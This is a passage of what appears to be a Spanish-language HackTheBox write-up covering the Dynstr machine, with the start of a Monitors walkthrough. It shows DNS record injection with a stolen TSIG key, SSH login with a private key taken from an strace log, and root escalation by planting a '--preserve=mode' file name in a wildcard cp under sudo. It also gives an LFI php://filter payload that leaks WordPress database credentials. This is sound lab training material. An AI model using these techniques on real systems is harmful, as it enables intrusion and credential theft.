AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen www-data@dynstr:/home/bindmgr/.ssh$ Tambien vemos el archivo id_rsa e id_rsa.pub en el log de strace de la ejecucion de curl.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -lah total 436K drwxr-xr-x 2 bindmgr bindmgr 4.0K Mar 13 14:53 . drwxr-xr-x 5 bindmgr bindmgr 4.0K Mar 15 20:39 .. -rw-r--r-- 1 bindmgr bindmgr 232K Mar 13 14:53 C62796521-debugging.script -rw-r--r-- 1 bindmgr bindmgr 29K Mar 13 14:53 C62796521-debugging.timing -rw-r--r-- 1 bindmgr bindmgr 1.2K Mar 13 14:53 command-output-C62796521.txt -rw-r--r-- 1 bindmgr bindmgr 160K Mar 13 14:52 strace-C62796521.txt www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt [... REDACTED ...] openat(AT_FDCWD, \u0026#34;/home/bindmgr/.ssh/id_rsa.pub\u0026#34;, O_RDONLY) = 5 fstat(5, {st_mode=S_IFREG|0644, st_size=395, ...}) = 0 read(5, \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen\\n\u0026#34;, 4096) = 395 [... REDACTED ...] openat(AT_FDCWD, \u0026#34;/home/bindmgr/.ssh/id_rsa\u0026#34;, O_RDONLY) = 5 fstat(5, {st_mode=S_IFREG|0600, st_size=1823, ...}) = 0 read(5, \u0026#34;-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\\nHjGnCvzI4UojALjC[... REDACTED ...]BQ==\\n-----END OPENSSH PRIVATE KEY-----\\n\u0026#34;, 4096) = 1823 read(5, \u0026#34;\u0026#34;, 4096) Aunque todos los hosts permitidos deben de estar en HOSTNAME.infra.dyna.htb si vemos el codigo de update cuando ejecuta nsupdate utiliza una llave que se encuentra en el directorio /etc/bind/.\n1 2 3 4 5 echo \u0026#34;server 127.0.0.1 zone no-ip.htb update delete test.no-ip.htb update add test.no-ip.htb 30 IN A no-ip.htb send\u0026#34; | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key\u0026#34; En este mismo directorio se encuentra la llave y configuracion para infra.key, vemos que es posible agregar un hostname en [hostname].dyna.htb, que es lo que necesitamos para poder ingresar por medio de SSH. Además vemos tambien que esta configurado para una busqueda de DNS inversa para las direcciones \u0026ldquo;locales\u0026rdquo; y \u0026ldquo;externas\u0026rdquo; 168.192.in-addr.arpa y 10.in-addr.arpa respectivamente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 www-data@dynstr:/etc/bind$ cat infra.key key \u0026#34;infra-key\u0026#34; { algorithm hmac-sha256; secret \u0026#34;7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=\u0026#34;; }; www-data@dynstr:/etc/bind$ cat named.conf.local // // Do any local configuration here // // Add infrastructure DNS updates. include \u0026#34;/etc/bind/infra.key\u0026#34;; zone \u0026#34;dyna.htb\u0026#34; IN { type master; file \u0026#34;dyna.htb.zone\u0026#34;; update-policy { grant infra-key zonesub ANY; }; }; zone \u0026#34;10.in-addr.arpa\u0026#34; IN { type master; file \u0026#34;10.in-addr.arpa.zone\u0026#34;; update-policy { grant infra-key zonesub ANY; }; }; zone \u0026#34;168.192.in-addr.arpa\u0026#34; IN { type master; file \u0026#34;168.192.in-addr.arpa.zone\u0026#34;; update-policy { grant infra-key zonesub ANY; }; }; // Enable DynDNS updates to customer zones. include \u0026#34;/etc/bind/ddns.key\u0026#34;; zone \u0026#34;dnsalias.htb\u0026#34; IN { type master; file \u0026#34;dnsalias.htb.zone\u0026#34;; update-policy { grant ddns-key zonesub ANY; }; }; zone \u0026#34;dynamicdns.htb\u0026#34; IN { type master; file \u0026#34;dynamicdns.htb.zone\u0026#34;; update-policy { grant ddns-key zonesub ANY; }; }; zone \u0026#34;no-ip.htb\u0026#34; IN { type master; file \u0026#34;no-ip.htb.zone\u0026#34;; update-policy { grant ddns-key zonesub ANY; }; }; // *** WORK IN PROGRESS, see bindmgr.sh *** // include \u0026#34;/etc/bind/named.conf.bindmgr\u0026#34;; www-data@dynstr:/etc/bind$ Registro .infra Siguiendo la documentacion creamos un comando para agregar un registro de DNS dinamico en .infra.dyna.htb.\nLa opcion A es para direcciones IPv4 Tiempo de vida 86400 segundos (1 dia) 1 2 3 4 echo \u0026#34;server 127.0.0.1 zone dyna.htb update add blog.infra.dyna.htb 86400 A 10.10.14.21 send\u0026#34; | /usr/bin/nsupdate -k /etc/bind/infra.key Al ejecutar dicho comando utilizamos dig para verificar que dicho registro apunte a nuestra direccion IP, lo cual logramos confirmar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 www-data@dynstr:/etc/bind$ echo \u0026#34;server 127.0.0.1 \u0026gt; zone dyna.htb \u0026gt; update add blog.infra.dyna.htb 86400 A 10.10.14.21 send\u0026#34; | /usr/bin/nsupdate -t 1 -k /etc/bind/infra.key www-data@dynstr:/etc/bind$ dig @127.0.0.1 blog.infra.dyna.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.1-Ubuntu \u0026lt;\u0026lt;\u0026gt;\u0026gt; @127.0.0.1 blog.infra.dyna.htb ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 26914 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 53e13e7ed08396d00100000060cd9d9dcd29fcb3ce76e02f (good) ;; QUESTION SECTION: ;blog.infra.dyna.htb. IN A ;; ANSWER SECTION: blog.infra.dyna.htb. 86400 IN A 10.10.14.21 ;; Query time: 0 msec ;; SERVER: 127.0.0.1#53(127.0.0.1) ;; WHEN: Sat Jun 19 09:32:45 CEST 2021 ;; MSG SIZE rcvd: 92 www-data@dynstr:/etc/bind$ Registro Dns Inversa De la misma forma que en INFRA, agregamos un registro de DNS inversa, tomando en cuenta la informacion de wikipedia.\nResolución inversa IPv4\n\u0026hellip; Por ejemplo, una dirección (A) para mail.example.com apunta a la dirección IP 192.0.2.5. En los registros de puntero de la base de datos inversa, esta dirección IP se almacena como el nombre de dominio 5.2.0.192.in-addr.arpa apuntando de nuevo a su nombre de host mail.example.com designado. \u0026hellip;\nSiguiendo ese ejemplo nuestra direccion IP quedaria de la siguiente forma.\n1 2 3 4 5 # mail.example.com --\u0026gt; 192.0.2.5 # DNS inversa --\u0026gt; 5.2.0.192.in-addr.arpa blog.infra.dyna.htb --\u0026gt; 10.10.14.21 DNS inversa --\u0026gt; 21.14.10.10.in-addr.arpa Siguiendo algunos ejemplos creamos un comando para agregar el registro.\n1 2 3 4 echo \u0026#34;server 127.0.0.1 zone 10.in-addr.arpa update add 21.14.10.10.in-addr.arpa 86400 IN PTR blog.infra.dyna.htb send\u0026#34; | /usr/bin/nsupdate -d -k /etc/bind/infra.key El registro se agrego sin errores.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 www-data@dynstr:/home/bindmgr/.ssh$ echo \u0026#34;server 127.0.0.1 \u0026gt; zone 10.in-addr.arpa \u0026gt; update add 21.14.10.10.in-addr.arpa 86400 IN PTR blog.infra.dyna.htb \u0026gt; send\u0026#34; | /usr/bin/nsupdate -d -k /etc/bind/infra.key Creating key... Creating key... namefromtext keycreate Sending update to 127.0.0.1#53 Outgoing update query: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: UPDATE, status: NOERROR, id: 31642 ;; flags:; ZONE: 1, PREREQ: 0, UPDATE: 1, ADDITIONAL: 1 ;; ZONE SECTION: ;10.in-addr.arpa. IN SOA ;; UPDATE SECTION: 21.14.10.10.in-addr.arpa. 86400 IN PTR blog.infra.dyna.htb. ;; TSIG PSEUDOSECTION: infra-key. 0 ANY TSIG hmac-sha256. 1624089193 300 32 d/fHeQ/cupRuCwGzWj/OtZwsDZ9Cx48laY79uPrYjII= 31642 NOERROR 0 Reply from update query: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: UPDATE, status: NOERROR, id: 31642 ;; flags: qr; ZONE: 1, PREREQ: 0, UPDATE: 0, ADDITIONAL: 1 ;; ZONE SECTION: ;10.in-addr.arpa. IN SOA ;; TSIG PSEUDOSECTION: infra-key. 0 ANY TSIG hmac-sha256. 1624089193 300 32 eB5IdsUPb9C++4TwR58TMsS6gue2nYDfcJwtpdir2Os= 31642 NOERROR 0 www-data@dynstr:/home/bindmgr/.ssh$ Shell Finalmente utilizamos la clave privada que encontramos con el usuario bindmgr, logramos obtener acceso y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 π ~/htb/dynstr ❯ ssh bindmgr@dyna.htb -i id_rsa_bindmgr Last login: Tue Jun 8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb bindmgr@dynstr:~$ whoami bindmgr bindmgr@dynstr:~$ ls -lah total 36K drwxr-xr-x 5 bindmgr bindmgr 4.0K Mar 15 20:39 . drwxr-xr-x 4 root root 4.0K Mar 15 20:26 .. lrwxrwxrwx 1 bindmgr bindmgr 9 Mar 15 20:29 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 bindmgr bindmgr 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 bindmgr bindmgr 3.7K Feb 25 2020 .bashrc drwx------ 2 bindmgr bindmgr 4.0K Mar 13 12:09 .cache -rw-r--r-- 1 bindmgr bindmgr 807 Feb 25 2020 .profile drwxr-xr-x 2 bindmgr bindmgr 4.0K Mar 13 12:09 .ssh drwxr-xr-x 2 bindmgr bindmgr 4.0K Mar 13 14:53 support-case-C62796521 -r-------- 1 bindmgr bindmgr 33 Jun 19 01:38 user.txt bindmgr@dynstr:~$ cat user.txt 7f333fc7f1894bf789487dc34043ef9e bindmgr@dynstr:~$ Privesc Tras ejecutar sudo -l -l vemos que tenemos permisos sudo (root) para ejecutar el script bindmgr.sh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 bindmgr@dynstr:~$ sudo -l -l sudo: unable to resolve host dynstr.dyna.htb: Name or service not known Matching Defaults entries for bindmgr on dynstr: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User bindmgr may run the following commands on dynstr: Sudoers entry: RunAsUsers: ALL Options: !authenticate Commands: /usr/local/bin/bindmgr.sh bindmgr@dynstr:~$ Dicho script crea un archivo como /etc/bind/named.conf, inicia verificando si el archivo .version existe y si contiene un numero, luego de eso incluye todos los archivos del directorio actual (pwd) dentro del archivo /etc/bind/named.conf.bindmgr y copia todos los archivos del directorio actual (pwd) a /etc/bind/named.bindmgr/, finalmente reinicia el servicio bind9.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 #!/usr/bin/bash # This script generates named.conf.bindmgr to workaround the problem # that bind/named can only include single files but no directories. # # It creates a named.conf.bindmgr file in /etc/bind that can be included # from named.conf.local (or others) and will include all files from the # directory /etc/bin/named.bindmgr. # # NOTE: The script is work in progress. For now bind is not including # named.conf.bindmgr. # # TODO: Currently the script is only adding files to the directory but # not deleting them. As we generate the list of files to be included # from the source directory they won\u0026#39;t be included anyway. BINDMGR_CONF=/etc/bind/named.conf.bindmgr BINDMGR_DIR=/etc/bind/named.bindmgr indent() { sed \u0026#39;s/^/ /\u0026#39;; } # Check versioning (.version) echo \u0026#34;[+] Running $0 to stage new configuration from $PWD.\u0026#34; if [[ ! -f .version ]] ; then echo \u0026#34;[-] ERROR: Check versioning. Exiting.\u0026#34; exit 42 fi if [[ \u0026#34;`cat .version 2\u0026gt;/dev/null`\u0026#34; -le \u0026#34;`cat $BINDMGR_DIR/.version 2\u0026gt;/dev/null`\u0026#34; ]] ; then echo \u0026#34;[-] ERROR: Check versioning. Exiting.\u0026#34; exit 43 fi # Create config file that includes all files from named.bindmgr. echo \u0026#34;[+] Creating $BINDMGR_CONF file.\u0026#34; printf \u0026#39;// Automatically generated file. Do not modify manually.\\n\u0026#39; \u0026gt; $BINDMGR_CONF for file in * ; do printf \u0026#39;include \u0026#34;/etc/bind/named.bindmgr/%s\u0026#34;;\\n\u0026#39; \u0026#34;$file\u0026#34; \u0026gt;\u0026gt; $BINDMGR_CONF done # Stage new version of configuration files. echo \u0026#34;[+] Staging files to $BINDMGR_DIR.\u0026#34; cp .version * /etc/bind/named.bindmgr/ # Check generated configuration with named-checkconf. echo \u0026#34;[+] Checking staged configuration.\u0026#34; named-checkconf $BINDMGR_CONF \u0026gt;/dev/null if [[ $? -ne 0 ]] ; then echo \u0026#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: \u0026#34; named-checkconf $BINDMGR_CONF 2\u0026gt;\u0026amp;1 | indent exit 44 else echo \u0026#34;[+] Configuration successfully staged.\u0026#34; # *** TODO *** Uncomment restart once we are live. # systemctl restart bind9 if [[ $? -ne 0 ]] ; then echo \u0026#34;[-] Restart of bind9 via systemctl failed. Please check logfile: \u0026#34; systemctl status bind9 else echo \u0026#34;[+] Restart of bind9 via systemctl succeeded.\u0026#34; fi fi Wildcards - root.txt El script utiliza asterisco (*) para copiar los archivos de la carpeta actual lo que lo hace vulnerable.\n1 cp .version * /etc/bind/named.bindmgr/ La documentacion de cp indica que la flag --no-preserve se le pueden pasar atributos para no preservar los permisos (ó atributo especificado) a los archivos copiados.\n\u0026ndash;no-preserve=ATTR_LIST\ndon\u0026rsquo;t preserve the specified attributes\nCreamos dicha flag con touch con el atributo mode (permisos del archivo), tambien el archivo .version.\n1 2 3 4 5 6 7 8 9 bindmgr@dynstr:~/tmp$ touch -- --no-preserve=mode,ownership bindmgr@dynstr:~/tmp$ echo 1 \u0026gt; .version bindmgr@dynstr:~/tmp$ ls -lah total 12K drwxrwxr-x 2 bindmgr bindmgr 4.0K Jun 19 12:29 . drwxr-xr-x 6 bindmgr bindmgr 4.0K Jun 19 11:27 .. -rw-rw-r-- 1 bindmgr bindmgr 0 Jun 19 12:29 \u0026#39;--no-preserve=mode\u0026#39; -rw-rw-r-- 1 bindmgr bindmgr 2 Jun 19 12:29 .version bindmgr@dynstr:~/tmp$ Como sabemos, el script copia todos los archivos de la carpeta, creamos un enlace simbolico utilizando ln apuntando al archivo root.txt.\n1 2 3 4 5 6 7 8 9 bindmgr@dynstr:~/tmp$ ln -s /root/root.txt bindmgr@dynstr:~/tmp$ ls -lah total 12K drwxrwxr-x 2 bindmgr bindmgr 4.0K Jun 19 12:31 . drwxr-xr-x 6 bindmgr bindmgr 4.0K Jun 19 11:27 .. -rw-rw-r-- 1 bindmgr bindmgr 0 Jun 19 12:29 \u0026#39;--no-preserve=mode\u0026#39; lrwxrwxrwx 1 bindmgr bindmgr 14 Jun 19 12:31 root.txt -\u0026gt; /root/root.txt -rw-rw-r-- 1 bindmgr bindmgr 2 Jun 19 12:29 .version bindmgr@dynstr:~/tmp$ Ejecutamos el script y logramos leer la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 bindmgr@dynstr:~/tmp$ sudo /usr/local/bin/bindmgr.sh sudo: unable to resolve host dynstr.dyna.htb: Name or service not known [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr/tmp. [+] Creating /etc/bind/named.conf.bindmgr file. [+] Staging files to /etc/bind/named.bindmgr. [+] Checking staged configuration. [-] ERROR: The generated configuration is not valid. Please fix following errors: /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/--no-preserve=mode: file not found bindmgr@dynstr:~/tmp$ ls -lah /etc/bind/named.bindmgr/ total 16K drwxr-sr-x 2 root bind 4.0K Jun 19 12:32 . drwxr-sr-x 3 root bind 4.0K Jun 19 12:32 .. -rw-r--r-- 1 root bind 33 Jun 19 12:32 root.txt -rw-r--r-- 1 root bind 2 Jun 19 12:32 .version bindmgr@dynstr:~/tmp$ cat /etc/bind/named.bindmgr/root.txt e95e1a6152fa877924feaee64aeb4386 bindmgr@dynstr:~/tmp$ Shell De la misma forma utilizamos una wildcard, en este caso --preserve con la opcion mode para obtener una copia de bash con los permisos root, de cierta forma estamos \u0026ldquo;creando\u0026rdquo; un archivo con permisos SUID, en el caso de --preserve=mode estaria \u0026ldquo;proporcionando\u0026rdquo; los permisos root (el usuario propietario (u)) y de nuestra parte estariamos activando el bit SUID (activar el bit SUID o SGID para ejecución (s)), por lo tanto quedaria de la siguiente forma si fuera con chmod: chmod u+s \u0026lt;archivo\u0026gt;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 bindmgr@dynstr:~/temp$ cp /bin/bash . bindmgr@dynstr:~/temp$ chmod +u bash bindmgr@dynstr:~/temp$ ls bash root.txt bindmgr@dynstr:~/temp$ touch -- --preserve=mode bindmgr@dynstr:~/temp$ echo 99 \u0026gt; .version bindmgr@dynstr:~/temp$ ls -lah bash -rwxr-xr-x 1 bindmgr bindmgr 1.2M Jun 19 01:37 bash bindmgr@dynstr:~/temp$ chmod +s bash bindmgr@dynstr:~/temp$ ls -lah bash -rwsr-sr-x 1 bindmgr bindmgr 1.2M Jun 19 01:37 bash bindmgr@dynstr:~/temp$ sudo /usr/local/bin/bindmgr.sh sudo: unable to resolve host dynstr.dyna.htb: Name or service not known [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr/temp. [+] Creating /etc/bind/named.conf.bindmgr file. [+] Staging files to /etc/bind/named.bindmgr. [+] Checking staged configuration. [-] ERROR: The generated configuration is not valid. Please fix following errors: /etc/bind/named.bindmgr/bash:1: unknown option \u0026#39;ELF...\u0026#39; /etc/bind/named.bindmgr/bash:14: unknown option \u0026#39;hȀE�\u0026#39; /etc/bind/named.bindmgr/bash:40: unknown option \u0026#39;�F\u0026#39; /etc/bind/named.bindmgr/bash:40: unexpected token near \u0026#39;}\u0026#39; bindmgr@dynstr:~/temp$ ls -lah /etc/bind/named.bindmgr/bash -rwsr-sr-x 1 root bind 1.2M Jun 19 01:38 /etc/bind/named.bindmgr/bash En este caso tendriamos una copia de bash con permisos SUID, por lo que ejecutamos bash -p para obtener una shell con permisos root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 bindmgr@dynstr:~/temp$ /etc/bind/named.bindmgr/bash -p bash-5.0# whoami root bash-5.0# id uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr) bash-5.0# cd /root bash-5.0# ls -lah total 36K drwx------ 5 root root 4.0K May 25 14:05 . drwxr-xr-x 18 root root 4.0K May 25 14:52 .. lrwxrwxrwx 1 root root 9 Mar 20 14:05 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3.1K Dec 5 2019 .bashrc drwx------ 2 root root 4.0K Mar 15 21:24 .cache drwxr-xr-x 4 root root 4.0K Mar 14 14:18 cleanup drwxr-xr-x 3 root root 4.0K May 25 14:05 .local -rw-r--r-- 1 root root 161 Dec 5 2019 .profile -r-------- 1 root root 33 Jun 19 01:15 root.txt -rw-r--r-- 1 root root 74 Mar 15 20:10 .selected_editor bash-5.0# ","description":"Dynstr presenta un \"sistema\" similar a no-ip donde logramos realizar command injection para obtener acceso. SSH tiene un tipo de autenticacion diferente, accedimos por este servicio agregando registros DNS y utilizando la clave privada de un archivo de log. Escalamos privilegios mediante Wildcards para el comando cp en la ejecucion de un script.","id":46,"section":"posts","tags":["no-ip","dynamic dns","reverse dns","command injection","wildcards","suid","nsupdate",""],"title":"Hack The Box - Dynstr","uri":"https://sckull.github.io/posts/dynstr/"},{"content":"\rMonitors una maquina de HackTheBox correo WordPress donde descubrimos un plugin vulnerable que nos permitio acceder a Cacti con una version vulnerable donde obtuvimos acceso a un contenedor explotando una vulnerabilidad SQL Injection a RCE. Un servicio de la maquina nos permitio obtener la contraseña de un segundo usuario. Tras una enumeracion encontramos Apache Ofbiz con una version vulnerable que nos permitio escalar privilegios. Listando las capabilities del contenedor escapamos de este creando y cargando un \u0026ldquo;kernel module\u0026rdquo;.\nNombre Monitors OS Linux Puntos 40 Dificultad Dificil IP 10.10.10.238 Maker TheCyberGeek\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.4, 6.8, 6.8, 3.2, 3.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 7, 7, 3, 3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon Nmap Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 Nmap scan report for 10.10.10.238 (10.10.10.238) Host is up (0.17s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA) | 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA) |_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web Site Encontramos una pagina web en el puerto 80 a la cual no estamos \u0026ldquo;permitidos\u0026rdquo; acceder, tambien muestra un dominio : monitors.htb.\n1 2 3 Sorry, direct IP access is not allowed. If you are having issues accessing the site then contact the website administrator: admin@monitors.htb WordPress El dominio muestra una pagina en wordpress, vemos un nombre de usuario (admin) en el unico post.\nShell - www-data WPScan Un escaneo de wordpress con WPscan nos muestra la version de wordpress (5.5.1) y el plugin wp-with-spritz en su version 1.0.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 [... split ...] [+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01). | Found By: Rss Generator (Passive Detection) | - http://monitors.htb/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.5.1\u0026lt;/generator\u0026gt; | - http://monitors.htb/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.5.1\u0026lt;/generator\u0026gt; [+] Enumerating Most Popular Plugins (via Passive Methods) [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] wp-with-spritz | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/ | Latest Version: 1.0 (up to date) | Last Updated: 2015-08-20T20:15:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 4.2.4 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt Searchsploit Dicho plugin parece ser vulnerable a RFI segun se muestra en searchsploit.\n1 2 3 4 5 6 7 8 π ~/htb/monitors ❯ searchsploit wp spritz -------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------------------- --------------------------------- WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion | php/webapps/44544.php -------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results π ~/htb/monitors ❯ WP with Spritz Tras verificar esta vulnerabilidad vemos que podemos realizar lectura de archivos de la maquina, enumeramos los archivos de Wordpress utilizando un wrapper de php para codificar la informacion, vemos las credenciales de la base de datos del archivo de configuracion (wp-config.php).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # /wp.spritz.content.filter.php?url=php://filter/convert.base64-encode/resource=../../../wp-config.php π ~/htb/monitors ❯ echo -n \u0026#34;.......3MucGhwJzsK\u0026#34; |base64 -d |grep -v \u0026#34;*\u0026#34; \u0026lt;?php define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wpadmin\u0026#39; ); define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;BestAdministrator@2020!\u0026#39; ); define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;KkY%W@\u0026gt;T}4CKTw5{.n_j3bywoB0k^|OKX0{}5|UqZ2!VH!^uWKJ.O oROc,h pp:\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;8\u0026gt;PIil3 7re_:3\u0026amp;@^8Zh|p^I8rwT}WpVr5|t^ih05A:]xjTA,UVXa8ny:b--/[Jk\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;dN c^]m:4O|GyOK50hQ1tumg4\u0026lt;JYlD2-,r,oq7GDjq4M Ri:x]Bod5L.S\u0026amp;.hEGfv\u0026#39; ); $table_prefix = \u0026#39;wp_\u0026#39;; define( \u0026#39;WP_DEBUG\u0026#39;, false ); if ( ! defined( \u0026#39;ABSPATH\u0026#39; ) ) { define( \u0026#39;ABSPATH\u0026#39;, __DIR__ . \u0026#39;/\u0026#39; ); } require_once ABSPATH . \u0026#39;wp-settings.php\u0026#39;; π ~/htb/monitors ❯ Cacti Dentro de los archivos de configuracion de apache2 (000-default.conf) encontramos en los comentarios el nombre de los sitios activos (monitors.htb.conf, cacti-admin.monitors.htb.conf) donde se menciona un subdomominio el cual agregamos al archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # url=/../../../..///etc/apache2/sites-enabled/000-default.conf # CONTENT - /etc/apache2/sites-enabled/000-default.conf # Default virtual host settings # Add monitors.htb.conf # Add cacti-admin.monitors.htb.conf # CONTENT - /etc/apache2/sites-enabled/monitors.htb.conf ServerAdmin admin@monitors.htb ServerName monitors.htb ServerAlias monitors.htb DocumentRoot /var/www/wordpress # CONTENT - 